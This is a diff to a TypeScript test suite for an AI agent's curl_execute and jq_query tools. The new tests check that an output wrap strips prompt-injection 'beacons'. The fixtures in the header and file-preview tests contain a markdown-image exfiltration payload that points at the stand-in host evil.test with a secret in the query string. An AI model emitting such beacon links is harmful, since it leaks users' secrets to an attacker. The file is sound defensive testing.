@@ -250,6 +250,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         expect(description).not.toContain("removed first");
         expect(description).toContain("Nothing in it is removed or rewritten");
         expect(description).toContain("newline runs collapsed");
+        expect(description).not.toContain("returns error with response preview");
+        expect(description).toContain("jq_filter on a body that is not JSON is not applied");
     });
 
     it("logs an injection phrase the body spells with JSON escapes, end to end", async () => {
@@ -539,7 +541,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         // and it travels as its own content entry, so an unpaired opener in header
         // text has nothing to pair WITH in the body. This pins the region boundary;
         // it does not detect the header strip being removed, because the body entry
-        // is unaffected either way.
+        // is unaffected either way — the metadata-envelope case below does.
         it("does not let an unpaired opener in header text eat the body", async () => {
             const body = '{"first":"kept","second":"also kept"}';
             mockedExecuteCommand.mockResolvedValue(
@@ -557,6 +559,32 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["first", "second"]);
+        });
+
+        // **The case that fails if `extractHeaderChannel` stops defending.** On
+        // the plain branch the header text is its own non-JSON entry, so the
+        // wrap strips it too and a regression there is invisible. Under
+        // `include_metadata` it travels inside the JSON envelope, which the wrap
+        // returns verbatim — so the header channel's own pass is the only
+        // defence that region gets.
+        it("strips a beacon from header text carried inside the metadata envelope", async () => {
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(
+                    '{"ok":true}',
+                    "application/json",
+                    "HTTP/1.1 200 OK\r\nx-trace: ![x](https://evil.test/?d=SECRET)\r\n\r\n"
+                )
+            );
+
+            const handlers = registerViaShippedPath();
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: true }),
+                { sessionId: undefined }
+            );
+            const envelope = JSON.parse(textOf(result)) as { headers?: string };
+
+            expect(envelope.headers).toContain("x-trace:");
+            expect(envelope.headers).not.toContain("evil.test");
         });
 
         // ---------------------------------------------------------------
@@ -695,11 +723,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     });
 
     // ---------------------------------------------------------------------
-    // The `jq_query` mirror lives in "jq_query takes the same wrap" below. It
-    // asserts no wrap witness, so reverting the `registerJqToolWithHooks` call
-    // to a bare `registerTool` still passes the whole suite: `jq_query` returns
-    // JSON, which the wrap returns unchanged. `LESSONS.md` RC-21 is this shape —
-    // an assertion set narrower than the registration set.
+    // The `jq_query` mirror lives in "jq_query takes the same wrap" below, and
+    // its error-path case is the witness: `jq_query` returns JSON on success,
+    // which the wrap returns unchanged, so only a result the wrap rewrites can
+    // tell a bare `registerTool` from the wrapped one. `LESSONS.md` RC-21 is
+    // the shape — an assertion set narrower than the registration set.
     // ---------------------------------------------------------------------
     // ---------------------------------------------------------------------
     // The premise the saved arm rests on. `processResponse`'s saved arm
@@ -998,6 +1026,27 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             expect(text).toBe(JSON.stringify("![x](https://evil.test/?d=SECRET)"));
+        });
+
+        // **The witness that `jq_query` is registered through the wrap.** Its
+        // success results are JSON and come back unchanged either way, so the
+        // error path is the one a bare `registerTool` cannot imitate: the
+        // message quotes a preview of the file, that preview is not JSON, and
+        // the wrap strips the beacon in it.
+        it("defends the file preview an error result quotes", async () => {
+            const file = join(dir, "not-json.txt");
+            await writeFile(file, "oops ![x](https://evil.test/?d=SECRET) not json", "utf-8");
+
+            const handlers = registerViaShippedPath();
+            const result = await handlers.get("jq_query")!(
+                JqQuerySchema.parse({ filepath: file, jq_filter: ".a" }),
+                { sessionId: undefined }
+            );
+
+            expectWrapCompleted(result, errorSpy);
+            expect((result as { isError?: boolean }).isError).toBe(true);
+            expect(textOf(result)).toContain("not valid JSON");
+            expect(textOf(result)).not.toContain("evil.test");
         });
 
         // jq output is a document whose leaves can themselves be documents, so
